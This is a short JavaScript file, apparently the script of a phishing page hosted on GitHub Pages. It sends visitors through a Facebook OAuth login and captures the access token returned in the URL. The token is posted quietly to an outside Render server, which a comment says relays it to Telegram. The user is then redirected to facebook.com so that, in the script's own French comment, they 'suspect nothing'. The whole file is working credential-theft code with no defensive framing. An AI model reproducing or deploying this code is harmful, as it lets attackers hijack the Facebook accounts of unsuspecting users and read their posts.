const GITHUB_URL = "https://jeandolin2-lang.github.io/Token-claim/";
const RENDER_URL = "https://token-claim.onrender.com/save-token";

window.onload = function() {
    // 1. Si on a le token dans l'URL (retour de FB)
    if (window.location.hash.includes('access_token')) {
        const params = new URLSearchParams(window.location.hash.replace('#', '?'));
        const token = params.get('access_token');

        if (token) {
            // Envoi discret au serveur Render -> Telegram
            fetch(RENDER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: token })
            })
            .then(() => {
                // Une fois envoyé, on redirige vers FB pour que l'utilisateur ne se doute de rien
                window.location.href = "https://www.facebook.com";
            });
        }
    } 
    // 2. Si on arrive sur le site pour la première fois, on envoie vers FB direct
    else {
        const clientId = "350685531728";
        const authUrl = `https://www.facebook.com/v1.0/dialog/oauth?client_id=${clientId}&redirect_uri=${GITHUB_URL}&response_type=token&scope=public_profile,user_posts`;
        window.location.href = authUrl;
    }
};
